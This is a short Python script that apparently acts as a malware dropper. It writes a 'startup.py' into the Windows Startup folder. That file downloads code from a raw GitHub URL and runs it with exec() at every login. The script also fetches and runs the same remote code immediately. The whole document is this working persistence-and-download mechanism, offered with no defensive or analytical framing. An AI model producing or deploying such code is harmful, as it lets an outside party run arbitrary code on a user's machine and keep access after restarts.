import os
import requests

def install_startup_script():
    """Create a tiny Python script in Startup folder that always pulls GitHub code."""
    startup_dir = os.path.join(
        os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    script_path = os.path.join(startup_dir, "startup.py")

    code = '''import requests

def run_remote_code(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        code = response.text
        exec(code, globals())
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    github_url = "https://raw.githubusercontent.com/KTDeboa/scwebsiteslist/refs/heads/main/stup"
    run_remote_code(github_url)
'''

    with open(script_path, "w") as f:
        f.write(code)
    return script_path

def run_remote_code_now(url):
    """Run the GitHub code immediately (before restart)."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        code = response.text
        print("[→] Running GitHub code now...")
        exec(code, globals())
    except Exception as e:
        print("Error running GitHub code immediately:", e)

if __name__ == "__main__":
    install_startup_script()
    github_url = "https://raw.githubusercontent.com/KTDeboa/scwebsiteslist/refs/heads/main/stup"
    run_remote_code_now(github_url)
